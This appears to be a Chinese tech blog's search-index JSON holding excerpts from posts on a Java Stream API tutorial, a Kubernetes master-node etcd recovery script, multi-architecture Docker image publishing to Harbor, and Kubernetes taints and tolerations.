因为状态为z或者Z的进程为僵尸进程，所以我们使用grep抓取stat状态为zZ进程 ","date":"2022-09-19","objectID":"/posts/2022/09/linux%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%9B%B4%E6%96%B0%E4%B8%AD/:2:0","tags":["Linux"],"title":"linux运维常用命令[更新中]","uri":"/posts/2022/09/linux%E8%BF%90%E7%BB%B4%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%9B%B4%E6%96%B0%E4%B8%AD/"},{"categories":["Java"],"content":"简单介绍Java的Stream用法 ","date":"2022-09-12","objectID":"/posts/2022/09/java-8-%E7%89%B9%E6%80%A7stream%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/:0:0","tags":["Java"],"title":"java 8 特性：Stream的使用方法","uri":"/posts/2022/09/java-8-%E7%89%B9%E6%80%A7stream%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"Stream简介 Stream是Java8提供的一个新的API，它位于java.util.stream包下。Stream API提供了一种新的方式来对Java集合进行操作，这种操作方式极大的提高了Java程序员的生产力，让程序员写出高效率、干净、简洁的代码。 我们可以将元素集合看作一种流， 流在管道中传输， 并且可以在管道的节点上进行处理， 比如筛选， 排序，聚合等。元素流在管道中经过中间操作的处理，最后由最终操作得到前面处理的结果 ","date":"2022-09-12","objectID":"/posts/2022/09/java-8-%E7%89%B9%E6%80%A7stream%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/:1:0","tags":["Java"],"title":"java 8 特性：Stream的使用方法","uri":"/posts/2022/09/java-8-%E7%89%B9%E6%80%A7stream%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"Stream方法 示例代码 class Employee { private Long empno; //员工号 private String ename; //员工姓名 private Integer salary; //薪水 private Integer deptno; //所属部门号 //此处省略get/set方法、构造方法以及toString方法 } Employee e1 = new Employee(7369L, \"SMITH\", 800, 20); Employee e2 = new Employee(7499L, \"ALLEN\", 1600, 30); Employee e3 = new Employee(7521L, \"WARD\", 1250, 30); Employee e4 = new Employee(7782L, \"CLARK\", 2450, 10); Employee e5 = new Employee(7876L, \"ADAMS\", 1100, 20); List\u003cEmployee\u003e employees = Arrays.asList(e1, e2, e3, e4, e5); forEach方法 forEach方法用于迭代stream流中的每一个元素 employees.stream().forEach(System.out::println); 执行结果： Employee{empno=7369, ename='SMITH', salary=800, deptno=20} Employee{empno=7499, ename='ALLEN', salary=1600, deptno=30} Employee{empno=7521, ename='WARD', salary=1250, deptno=30} Employee{empno=7782, ename='CLARK', salary=2450, deptno=10} Employee{empno=7876, ename='ADAMS', salary=1100, deptno=20} map方法 map方法用于根据自定义的规则对stream流中的数据做一对一的映射 //获取所有员工的姓名 List\u003cString\u003e enames = employees.stream().map(employee -\u003e employee.getEname()).collect(Collectors.toList()); enames.stream().forEach(System.out::println); 执行结果： SMITH ALLEN WARD CLARK ADAMS mapToInt/mapToLong/mapToDouble方法 这几个方法主要用来对stream流中的元素产生单个的统计结果 //获取所有员工的薪水总和 int totalSalary = employees.stream().mapToInt(employee -\u003e employee.getSalary()).sum(); System.out.println(\"薪水总和：\" + totalSalary); 执行结果： 薪水总和：7200 filter方法 filter方法用于根据设置的条件对stream流中的数据做过滤操作 //获取薪水超过1500的员工 List\u003cEmployee\u003e filterEmp = employees.stream().filter(employee -\u003e employee.getSalary()\u003e1500).collect(Collectors.toList()); filterEmp.stream().forEach(System.out::println); 执行结果： Employee{empno=7499, ename='ALLEN', salary=1600, deptno=30} Employee{empno=7782, ename='CLARK', salary=2450, deptno=10} sorted方法 sorted方法用于对流中的元素进行排序 //按员工的薪水由低到高排序 List\u003cEmployee\u003e sortedEmp = employees.stream().sorted(Comparator.comparing(Employee::getSalary)).collect(Collectors.toList()); sortedEmp.stream().forEach(System.out::println); 执行结果： Employee{empno=7369, ename='SMITH', salary=800, deptno=20} Employee{empno=7876, ename='ADAMS', salary=1100, deptno=20} Employee{empno=7521, ename='WARD', salary=1250, deptno=30} Employee{empno=7499, ename='ALLEN', salary=1600, deptno=30} Employee{empno=7782, ename='CLARK', salary=2450, deptno=10} Collectors类 Collectors 类实现了很多归约操作，例如将流转换成集合和聚合元素。Collectors 可用于返回列表或字符串 //按员工所属部门号进行分类 Map\u003cInteger, List\u003cEmployee\u003e\u003e map = employees.stream().collect(Collectors.groupingBy(employee -\u003e employee.getDeptno())); for(Map.Entry\u003cInteger, List\u003cEmployee\u003e\u003e entry : map.entrySet()) { System.out.println(\"key: \" + entry.getKey() + \" value：\" + entry.getValue()); } System.out.println(); //获取员工姓名，用\",\"进行拼接 String enameString = employees.stream().map(employee -\u003e employee.getEname()).collect(Collectors.joining(\",\")); System.out.println(enameString); 执行结果： key: 20 value：[Employee{empno=7369, ename='SMITH', salary=800, deptno=20}, Employee{empno=7876, ename='ADAMS', salary=1100, deptno=20}] key: 10 value：[Employee{empno=7782, ename='CLARK', salary=2450, deptno=10}] key: 30 value：[Employee{empno=7499, ename='ALLEN', salary=1600, deptno=30}, Employee{empno=7521, ename='WARD', salary=1250, deptno=30}] SMITH,ALLEN,WARD,CLARK,ADAMS 方法串联 Stream API提供的多个方法可以在一行代码中同时串联使用 //获取20号部门员工姓名,按薪水从高到低排序 List\u003cString\u003e names = employees.stream().filter(employee -\u003e employee.getDeptno().equals(20)).sorted(Comparator.comparing(Employee::getSalary).reversed()).map(employee -\u003e employee.getEname()).collect(Collectors.toList()); names.stream().forEach(System.out::println); 执行结果： ADAMS SMITH 总结 Stream API提供了多个方法对集合进行映射、过滤、排序等操作，相比于Java7，大大简化了代码的开发。记住：Stream API中的方法并不会影响原始集合 ","date":"2022-09-12","objectID":"/posts/2022/09/java-8-%E7%89%B9%E6%80%A7stream%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/:2:0","tags":["Java"],"title":"java 8 特性：Stream的使用方法","uri":"/posts/2022/09/java-8-%E7%89%B9%E6%80%A7stream%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"},{"categories":["Java"],"content":"测试demo StreamList.java package com.imooc.zhangxiaoxi.stream; import com.imooc.zhangxiaoxi.lambda.cart.CartService; import com.imooc.zhangxiaoxi.lambda.cart.Sku; import lombok.Data; import org.junit.Before; import org.junit.Test; import java.util.*; import java.util.stream.Collectors; @Data class Employee { private Long empno; //员工号 private String ename; //员工姓名 private Integer salary; //薪水 private Integer deptno; //所属部门号 public Employee(long l, String adams, int i, int i1) { empno = l; ename = adams; salary = i; deptno = i1; } //此处省略get/set方法、构造方法以及toString方法 } public class StreamList { List\u003cSku\u003e list; List\u003cEmployee\u003e employees; List\u003cString\u003e labels; @Before public void init() { list = CartService.getCartSkuList(); Employee e1 = new Employee(7369L, \"SMITH\", 800, 20); Employee e2 = new Employee(7499L, \"ALLEN\", 1600, 30); Employee e3 = new Employee(7521L, \"WARD\", 1250, 30); Employee e4 = new Employee(7782L, \"CLARK\", 2450, 10); Employee e5 = new Employee(7876L, \"ADAMS\", 1100, 20); employees = Arrays.asList(e1, e2, e3, e4, e5); String l1 = \"iresource.fault.io/acceleratorcard\"; String l2 = \"iresource.fault.io/sharestorage\"; String l3 = \"iresource.fault.io/calcnetwork\"; labels = Arrays.asList(l1, l2, l3); } @Test public void listTest() { employees.forEach(System.out::println); // employees.forEach( ele -\u003e { // String tmp = ele+\"eeee\"; // System.out.println(tmp); // }); //获取所有员工的姓名 List\u003cString\u003e enames = employees.stream().map(employee -\u003e employee.getEname()).collect(Collectors.toList()); enames.stream().forEach(System.out::println); //获取所有员工的薪水总和 // int totalSalary = employees.stream().mapToInt(Employee::getSalary).sum(); int totalSalary = employees.stream().mapToInt(employee -\u003e employee.getSalary()).sum(); System.out.println(\"薪水总和：\" + totalSalary); //获取薪水超过1500的员工 List\u003cEmployee\u003e filterEmp = employees.stream().filter(employee -\u003e employee.getSalary() \u003e 1500).collect(Collectors.toList()); filterEmp.stream().forEach(System.out::println); //按员工的薪水由低到高排序 List\u003cEmployee\u003e sortedEmp = employees.stream().sorted(Comparator.comparing(Employee::getSalary)).collect(Collectors.toList()); sortedEmp.stream().forEach(System.out::println); //按员工所属部门号进行分类 Map\u003cInteger, List\u003cEmployee\u003e\u003e map = employees.stream().collect(Collectors.groupingBy(employee -\u003e employee.getDeptno())); for (Map.Entry\u003cInteger, List\u003cEmployee\u003e\u003e entry : map.entrySet()) { System.out.println(\"key: \" + entry.getKey() + \" value：\" + entry.getValue()); } System.out.println(); //获取员工姓名，用\",\"进行拼接 String enameString = employees.stream().map(employee -\u003e employee.getEname()).collect(Collectors.joining(\",\")); System.out.println(enameString); // labels 测试 System.out.println(); System.out.println(\"=============== LABEL TEST ====================\"); System.out.println(); String labelsStr = labels.stream().collect(Collectors.joining(\";\")); System.out.println(labelsStr); // lables 比较 String l1 = \"iresource.fault.io/acceleratorcard\"; String l2 = \"iresource.fault.io/sharestorage\"; String l3 = \"iresource.fault.io/calcnetwork\"; String l4 = \"iresource.fault.io/xxxxx\"; List\u003cString\u003e list2 = Arrays.asList(l2, l3, l1); List\u003cString\u003e list3 = Arrays.asList(l1, l2, l4); List\u003cString\u003e list4 = Arrays.asList(l1, l2, l3, l4); List\u003cString\u003e list5 = Arrays.asList(l4, l2, l3, l4); String tLabelStr = labels.stream().sorted().collect(Collectors.joining()); String tlist2Str = list2.stream().collect(Collectors.joining()); System.out.println(\"labels.sort\"); System.out.println(tLabelStr); System.out.println(\"list2\"); System.out.println(tlist2Str); boolean ret1 =labels.equals(list2.stream().sorted().collect(Collectors.joining())); boolean ret2 = isLabelListEquals(labels, list2); boolean ret3 = isLabelListEquals(labels, list3); boolean ret4 = isLabelListEquals(labels, list4); boolean ret5 = isLabelListEquals(labels, list5); boolean ret6 = isLabelListEquals(labels, null); System.out.println(\"labels equals list2.sort: \" + ret1); System.out.println(\"labels.sort equals list2.sort: \" + ret2); System.out.println(\"labels.sort equals list3.sort:","date":"2022-09-12","objectID":"/posts/2022/09/java-8-%E7%89%B9%E6%80%A7stream%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/:3:0","tags":["Java"],"title":"java 8 特性：Stream的使用方法","uri":"/posts/2022/09/java-8-%E7%89%B9%E6%80%A7stream%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"},{"categories":["K8S"],"content":"项目笔记：k8s的master节点恢复操作 如果k8s的master节点异常，更新节点设备后，需要对该master节点进行k8s恢复。 场景：k8s高可用环境中，某master节点异常，少了一个master节点，会导致etcd的高可用状态不稳定。所以需要进行该master节点恢复。 ","date":"2022-09-03","objectID":"/posts/2022/09/k8s%E7%9A%84master%E8%8A%82%E7%82%B9%E6%81%A2%E5%A4%8D%E6%93%8D%E4%BD%9C/:0:0","tags":["K8S"],"title":"k8s的master节点恢复操作","uri":"/posts/2022/09/k8s%E7%9A%84master%E8%8A%82%E7%82%B9%E6%81%A2%E5%A4%8D%E6%93%8D%E4%BD%9C/"},{"categories":["K8S"],"content":"自动化恢复脚本 recover_k8s_master.sh 此脚本处理k8s1.14.8版本的master组件恢复，包括：hosts_config、[docker-conf、] etcd、kubelet、master、calico #!/bin/bash # 此脚本处理k8s1.14.8版本的master组件恢复，包括：hosts_config、[docker-conf、] etcd、kubelet、master、calico # k8s恢复脚本执行预置条件： # 1. 新节点已配置待恢复节点的ip和hostname # 2. 新节点已配置集群节点hosts，并能与原集群节点免密访问 # 3. 新节点已安装了etcd和k8s相关组件 # 4. 已知要执行恢复操作的版本是 v3_1(k8s1.14.8) 还是 v3_2(k8s1.20.5) # 5. 已知原节点的hostname、ip、etcdname和待恢复节点的hostname、ip、etcdname stop_commons(){ #systemctl stop harbor systemctl stop kubelet systemctl stop etcd systemctl stop docker } start_commons(){ systemctl daemon-reload systemctl restart docker #sleep 2s systemctl restart etcd sleep 2s systemctl enable kubelet systemctl restart kubelet sleep 5s } hosts_config(){ ## 1. hosts-conf set -e scp -r ${src_ip}:/etc/hosts /etc/hosts set +e } etcd_collect_config(){ # src_ip=10.151.11.61 # new_ip=192.168.100.3 # src_hostname=node1 # new_hostname=node3 # src_etcdname=etcd1 # new_etcdname=etcd3 set -e scp -r ${src_ip}:/etc/ssl/etcd /home/recover/etc/ set +e cp -r /etc/ssl/etcd /home/tmp/etcd rm -rf /etc/ssl/etcd cp -r /home/recover/etc/etcd /etc/ssl/ ## check etcd ssl # grep_ret=$(ls /etc/ssl/etcd/ssl |grep node1|wc -l) grep_ret=$(ls /etc/ssl/etcd/ssl |grep ${new_hostname} |wc -l) if [[ ${grep_ret} == 0 ]]; then #statements echo \"Failed to etcd_collect_config etcd ssl.\" exit 11 fi ## etcd cofig set -e scp -r ${src_ip}:/etc/etcd.env /etc/etcd.env scp -r ${src_ip}:/etc/systemd/system/etcd.service /etc/systemd/system/etcd.service scp -r ${src_ip}:/usr/local/bin/etcd /usr/local/bin/etcd scp -r ${src_ip}:/usr/local/bin/etcdctl /usr/local/bin/etcdctl # scp -r ${src_ip}:/usr/local/bin/etcd-scripts /usr/local/bin/etcd-scripts set +e } etcd_common_config(){ set -e ## vi /etc/etcd.env etcd_env=/etc/etcd.env # src_ip=10.151.11.61 # new_ip=192.168.100.3 # src_hostname=node1 # new_hostname=node3 # src_etcdname=etcd1 # new_etcdname=etcd3 # sed -n '/^ETCD_INITIAL_CLUSTER=/!s/'${src_ip}'/'${new_ip}'/gp' ${etcd_env} sed -i '/^ETCD_INITIAL_CLUSTER=/!s/'${src_ip}'/'${new_ip}'/g' ${etcd_env} sed -i 's|ETCD_NAME=.*$|ETCD_NAME='${new_etcdname}'|g' ${etcd_env} sed -i 's|'${src_hostname}'|'${new_hostname}'|g' ${etcd_env} ## vi /etc/systemd/system/etcd.service etcd_service=/etc/systemd/system/etcd.service sed -i 's|'${src_etcdname}'|'${new_etcdname}'|g' ${etcd_service} ## vi /usr/local/bin/etcd etcd_bin=/usr/local/bin/etcd sed -i 's|'${src_etcdname}'|'${new_etcdname}'|g' ${etcd_bin} set +e ## config new etcd member systemctl stop etcd # ETCDCTL_API=3 etcdctl --endpoints=https://100.7.36.106:2379 --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/member-node1.pem --key=/etc/ssl/etcd/ssl/member-node1-key.pem member list |grep etcd3 |cut -d\",\" -f1 rm -rf /var/lib/etcd/ ## get new_etcdid new_etcdid=$(ETCDCTL_API=3 etcdctl --endpoints=https://${src_ip}:2379 --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/member-${src_hostname}.pem --key=/etc/ssl/etcd/ssl/member-${src_hostname}-key.pem member list |grep ${new_etcdname} |cut -d\",\" -f1) if [[ \"x\"${new_etcdid}\"x\" == \"xx\" ]];then echo \"Warning: Failed to find ${new_etcdname}in etcd member list. Check the new_etcdname validity\" exit 12 fi ## remove this new_etcdid member ETCDCTL_API=3 etcdctl --endpoints=https://${src_ip}:2379 --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/member-${src_hostname}.pem --key=/etc/ssl/etcd/ssl/member-${src_hostname}-key.pem member remove ${new_etcdid} ## add this new_etcdname member ETCDCTL_API=3 etcdctl --endpoints=https://${src_ip}:2379 --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/member-${src_hostname}.pem --key=/etc/ssl/etcd/ssl/member-${src_hostname}-key.pem member add ${new_etcdname} --peer-urls=https://${new_ip}:2380 systemctl daemon-reload systemctl start docker systemctl enable etcd systemctl restart etcd sleep 15s ## check etcd ETCDCTL_API=3 etcdctl --endpoints=https://${new_ip}:2379 --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/member-${new_hostname}.pem --key=/etc/ssl/etcd","date":"2022-09-03","objectID":"/posts/2022/09/k8s%E7%9A%84master%E8%8A%82%E7%82%B9%E6%81%A2%E5%A4%8D%E6%93%8D%E4%BD%9C/:1:0","tags":["K8S"],"title":"k8s的master节点恢复操作","uri":"/posts/2022/09/k8s%E7%9A%84master%E8%8A%82%E7%82%B9%E6%81%A2%E5%A4%8D%E6%93%8D%E4%BD%9C/"},{"categories":["Docker"],"content":"如何更新自定义镜像arm版本的操作步骤","date":"2022-09-01","objectID":"/posts/2022/09/arm%E5%B9%B3%E5%8F%B0%E9%95%9C%E5%83%8F%E9%80%82%E9%85%8D%E6%93%8D%E4%BD%9C/","tags":["Docker"],"title":"arm平台镜像适配操作","uri":"/posts/2022/09/arm%E5%B9%B3%E5%8F%B0%E9%95%9C%E5%83%8F%E9%80%82%E9%85%8D%E6%93%8D%E4%BD%9C/"},{"categories":["Docker"],"content":"项目笔记：记录如何更新自定义镜像arm版本的操作步骤： ","date":"2022-09-01","objectID":"/posts/2022/09/arm%E5%B9%B3%E5%8F%B0%E9%95%9C%E5%83%8F%E9%80%82%E9%85%8D%E6%93%8D%E4%BD%9C/:0:0","tags":["Docker"],"title":"arm平台镜像适配操作","uri":"/posts/2022/09/arm%E5%B9%B3%E5%8F%B0%E9%95%9C%E5%83%8F%E9%80%82%E9%85%8D%E6%93%8D%E4%BD%9C/"},{"categories":["Docker"],"content":"环境 harbor已配置支持多芯片平台半版本，可以按amd和arm来区分不同平台的镜像。 ","date":"2022-09-01","objectID":"/posts/2022/09/arm%E5%B9%B3%E5%8F%B0%E9%95%9C%E5%83%8F%E9%80%82%E9%85%8D%E6%93%8D%E4%BD%9C/:1:0","tags":["Docker"],"title":"arm平台镜像适配操作","uri":"/posts/2022/09/arm%E5%B9%B3%E5%8F%B0%E9%95%9C%E5%83%8F%E9%80%82%E9%85%8D%E6%93%8D%E4%BD%9C/"},{"categories":["Docker"],"content":"initcontainer # 导入镜像 docker load -i initstorcontainer_arm64.img.tar # initstorcontainer:arm64 # 168.170.141.42为 harbor ip 将环境中的多平台版本镜像信息写到manifest HARBOR_SVC=168.170.141.42:5000 # tag and push arm64, amd64 images docker tag initstorcontainer:arm64 ${HARBOR_SVC}/example/initstorcontainer:arm64 docker push ${HARBOR_SVC}/example/initstorcontainer:arm64 docker tag ${HARBOR_SVC}/example/initstorcontainer:v1 ${HARBOR_SVC}/example/initstorcontainer:amd64 docker push ${HARBOR_SVC}/example/initstorcontainer:amd64 # manifest images: arm64;amd64 docker manifest create ${HARBOR_SVC}/example/initstorcontainer:v1 ${HARBOR_SVC}/example/initstorcontainer:amd64 ${HARBOR_SVC}/example/initstorcontainer:arm64 --insecure docker manifest annotate ${HARBOR_SVC}/example/initstorcontainer:v1 ${HARBOR_SVC}/example/initstorcontainer:arm64 --os linux --arch arm64 docker manifest annotate ${HARBOR_SVC}/example/initstorcontainer:v1 ${HARBOR_SVC}/example/initstorcontainer:amd64 --os linux --arch amd64 docker manifest push ${HARBOR_SVC}/example/initstorcontainer:v1 --insecure # check mainifest info docker manifest inspect ${HARBOR_SVC}/example/initstorcontainer:v1 [root@node1 initstorcontainer]# docker manifest inspect ${HARBOR_SVC}/example/initstorcontainer:v1 { \"schemaVersion\": 2, \"mediaType\": \"application/vnd.docker.distribution.manifest.list.v2+json\", \"manifests\": [ { \"mediaType\": \"application/vnd.docker.distribution.manifest.v2+json\", \"size\": 3044, \"digest\": \"sha256:ef012768aa11318ca71a07c57a1b289b0a07221dbf662a2eb02edb79a7f44a93\", \"platform\": { \"architecture\": \"amd64\", \"os\": \"linux\" } }, { \"mediaType\": \"application/vnd.docker.distribution.manifest.v2+json\", \"size\": 2202, \"digest\": \"sha256:591cef09d5c11e6ab6bc63398b592420805d4fcb0f5eef2060b2b86c14cfe1be\", \"platform\": { \"architecture\": \"arm64\", \"os\": \"linux\", \"variant\": \"v8\" } } ] } ","date":"2022-09-01","objectID":"/posts/2022/09/arm%E5%B9%B3%E5%8F%B0%E9%95%9C%E5%83%8F%E9%80%82%E9%85%8D%E6%93%8D%E4%BD%9C/:2:0","tags":["Docker"],"title":"arm平台镜像适配操作","uri":"/posts/2022/09/arm%E5%B9%B3%E5%8F%B0%E9%95%9C%E5%83%8F%E9%80%82%E9%85%8D%E6%93%8D%E4%BD%9C/"},{"categories":["Docker"],"content":"dataset-agent 因为版本更新，所以替换dataset-agent分3部分完成 先构建dataset-agent的arm版本镜像，该镜像版本可能不是安装匹配版本 在arm节点上，更新arm版本镜像中的dataset-agent组件 保存最新的dataset-agent镜像，并推送到harbor仓库中 # 导入镜像 docker load -i dataset-agent_arm64.img.tar # example/dataset-agent-arm64:v1 # 168.170.141.42为 harbor ip 导入多版本基础镜像 HARBOR_SVC=168.170.141.42:5000 docker tag example/dataset-agent-arm64:v1 ${HARBOR_SVC}/example/dataset-agent:arm64 docker push ${HARBOR_SVC}/example/dataset-agent:arm64 docker tag ${HARBOR_SVC}/example/dataset-agent:latest ${HARBOR_SVC}/example/dataset-agent:amd64 docker push ${HARBOR_SVC}/example/dataset-agent:amd64 docker manifest create ${HARBOR_SVC}/example/dataset-agent ${HARBOR_SVC}/example/dataset-agent:amd64 ${HARBOR_SVC}/example/dataset-agent:arm64 --insecure docker manifest annotate ${HARBOR_SVC}/example/dataset-agent ${HARBOR_SVC}/example/dataset-agent:arm64 --os linux --arch arm64 docker manifest annotate ${HARBOR_SVC}/example/dataset-agent ${HARBOR_SVC}/example/dataset-agent:amd64 --os linux --arch amd64 docker manifest push ${HARBOR_SVC}/example/dataset-agent --insecure docker manifest inspect ${HARBOR_SVC}/example/dataset-agent --insecure # 在k8s master节点上，执行命令，重启准备操作arm节点上的dataset-agent的pod ### example dataset-4rzhl 为 arm节点上的dataset-agent的pod kubectl delete pod -n example dataset-4rzhl # 将 dataset-agent-3.4.0-SNAPSHOT.jar 拷贝到arm节点上 node-22-arm是arm节点的hostname scp -r dataset-agent-3.4.0-SNAPSHOT.jar node-22-arm:/tmp/ # 在要操作的arm节点上，找到要更新的dataset-agent容器的容器id docker ps -a |grep dataset-agent 示例，dataset-agent的容器id是49fa7e36c208： docker ps -a |grep dataset-agent 49fa7e36c208 168.170.141.42:5000/example/dataset-agent \"/deployments/run-ja…\" # 对dataset-agent容器进行最新版本更新 cidname=49fa7e36c208 docker cp /tmp/dataset-agent-3.4.0-SNAPSHOT.jar ${cidname}:/deployments/example/ docker commit -m 'make image' ${cidname} ${HARBOR_SVC}/example/dataset-agent:arm64 说明: 如果该命令执行失败：docker push ${HARBOR_SVC}/example/dataset-agent:arm64 –insecure，则需login docker，或者在harbor节点上 推送该镜像 失败时，则需继续下面步骤操作： # 把dataset镜像打包拷贝到master节点 即harbor所在节点 docker save ${HARBOR_SVC}/example/dataset-agent:arm64 -o /tmp/dataset-agent-arm64.img.tar # 在master节点 即harbor所在节点 scp -r node-22-arm:/tmp/dataset-agent-arm64.img.tar /tmp/ docker load -i /tmp/dataset-agent-arm64.img.tar docker push ${HARBOR_SVC}/example/dataset-agent:arm64 # 再次重启所有节点的dataset-agent ","date":"2022-09-01","objectID":"/posts/2022/09/arm%E5%B9%B3%E5%8F%B0%E9%95%9C%E5%83%8F%E9%80%82%E9%85%8D%E6%93%8D%E4%BD%9C/:3:0","tags":["Docker"],"title":"arm平台镜像适配操作","uri":"/posts/2022/09/arm%E5%B9%B3%E5%8F%B0%E9%95%9C%E5%83%8F%E9%80%82%E9%85%8D%E6%93%8D%E4%BD%9C/"},{"categories":["K8S"],"content":"k8s的pod的污点容忍度和亲和性说明","date":"2022-08-01","objectID":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/","tags":["K8S"],"title":"k8s的pod的污点容忍度和亲和性说明[k8s pod tanit-tolerance and affinity]","uri":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/"},{"categories":["K8S"],"content":"介绍k8s的pod的污点容忍度和亲和性 ","date":"2022-08-01","objectID":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/:0:0","tags":["K8S"],"title":"k8s的pod的污点容忍度和亲和性说明[k8s pod tanit-tolerance and affinity]","uri":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/"},{"categories":["K8S"],"content":"污点和容忍度 节点亲和性 是 Pod 的一种属性，它使 Pod 被吸引到一类特定的节点 （这可能出于一种偏好，也可能是硬性要求）。 污点（Taint） 则相反——它使节点能够排斥一类特定的 Pod。 容忍度（Toleration） 是应用于 Pod 上的。容忍度允许调度器调度带有对应污点的节点。 容忍度允许调度但并不保证调度：作为其功能的一部分， 调度器也会评估其他参数。 污点和容忍度（Toleration）相互配合，可以用来避免 Pod 被分配到不合适的节点上。 每个节点上都可以应用一个或多个污点，这表示对于那些不能容忍这些污点的 Pod， 是不会被该节点接受的。 ","date":"2022-08-01","objectID":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/:1:0","tags":["K8S"],"title":"k8s的pod的污点容忍度和亲和性说明[k8s pod tanit-tolerance and affinity]","uri":"/posts/2022/08/k8s%E7%9A%84pod%E7%9A%84%E6%B1%A1%E7%82%B9%E5%AE%B9%E5%BF%8D%E5%BA%A6%E5%92%8C%E4%BA%B2%E5%92%8C%E6%80%A7%E8%AF%B4%E6%98%8Ek8s-pod-tanit-tolerance-and-affinity/"},{"categories":["K8S"],"content":"概念 你可以使用命令 kubectl taint 给节点增加一个污点。比如， kubectl taint nodes node1 key1=value1:NoSchedule 给节点 node1 增加一个污点，它的键名是 key1，键值是 value1，效果是 NoSchedule。 这表示只有拥有和这个污点相匹配的容忍度的 Pod 才能够被分配到 node1 这个节点。 若要移除上述命令所添加的污点，你可以执行： kubectl taint nodes node1 key1=value1:NoSchedule- 你可以在 Pod 规约中为 Pod 设置容忍度。 下面两个容忍度均与上面例子中使用 kubectl taint 命令创建的污点相匹配， 因此如果一个 Pod 拥有其中的任何一个容忍度，都能够被调度到 node1 ： tolerations:- key:\"key1\"operator:\"Equal\"value:\"value1\"effect:\"NoSchedule\"tolerations:- key:\"key1\"operator:\"Exists\"effect:\"NoSchedule\" 这里是一个使用了容忍度的 Pod： pods/pod-with-toleration.yaml apiVersion:v1kind:Podmetadata:name:nginxlabels:env:testspec:containers:- name:nginximage:nginximagePullPolicy:IfNotPresenttolerations:- key:\"example-key\"operator:\"Exists\"effect:\"NoSchedule\" operator 的默认值是 Equal。 一个容忍度和一个污点相“匹配”是指它们有一样的键名和效果，并且： 如果 operator 是 Exists （此时容忍度不能指定 value），或者 如果 operator 是 Equal ，则它们的 value 应该相等 说明： 存在两种特殊情况： 如果一个容忍度的 key 为空且 operator 为 Exists， 表示这个容忍度与任意的 key、value 和 effect 都匹配，即这个容忍度能容忍任何污点。 如果 effect 为空，则可以与所有键名 key1 的效果相匹配。 上述例子中 effect 使用的值为 NoSchedule，你也可以使用另外一个值 PreferNoSchedule。 这是“优化”或“软”版本的 NoSchedule —— 系统会 尽量 避免将 Pod 调度到存在其不能容忍污点的节点上， 但这不是强制的。effect 的值还可以设置为 NoExecute，下文会详细描述这个值。 你可以给一个节点添加多个污点，也可以给一个 Pod 添加多个容忍度设置。 Kubernetes 处理多个污点和容忍度的过程就像一个过滤器：从一个节点的所有污点开始遍历， 过滤掉那些 Pod 中存在与之相匹配的容忍度的污点。余下未被过滤的污点的 effect 值决定了 Pod 是否会被分配到该节点，特别是以下情况： 如果未被忽略的污点中存在至少一个 effect 值为 NoSchedule 的污点， 则 Kubernetes 不会将 Pod 调度到该节点。 如果未被忽略的污点中不存在 effect 值为 NoSchedule 的污点， 但是存在 effect 值为 PreferNoSchedule 的污点， 则 Kubernetes 会 尝试 不将 Pod 调度到该节点。 如果未被忽略的污点中存在至少一个 effect 值为 NoExecute 的污点， 则 Kubernetes 不会将 Pod 调度到该节点（如果 Pod 还未在节点上运行）， 或者将 Pod 从该节点驱逐（如果 Pod 已经在节点上运行）。 例如，假设你给一个节点添加了如下污点 kubectl taint nodes node1 key1=value1:NoSchedule kubectl taint nodes node1 key1=value1:NoExecute kubectl taint nodes node1 key2=value2:NoSchedule 假定有一个 Pod，它有两个容忍度： tolerations:- key:\"key1\"operator:\"Equal\"value:\"value1\"effect:\"NoSchedule\"- key:\"key1\"operator:\"Equal\"value:\"value1\"effect:\"NoExecute\" 在这种情况下，上述 Pod 不会被调度到上述节点，因为其没有容忍度和第三个污点相匹配。 但是如果在给节点添加上述污点之前，该 Pod 已经在上述节点运行， 那么它还可以继续运行在该节点上，因为第三个污点是三个污点中唯一不能被这个 Pod 容忍的。 通常情况下，如果给一个节点添加了一个 effect 值为 NoExecute 的污点， 则任何不能忍受这个污点的 Pod 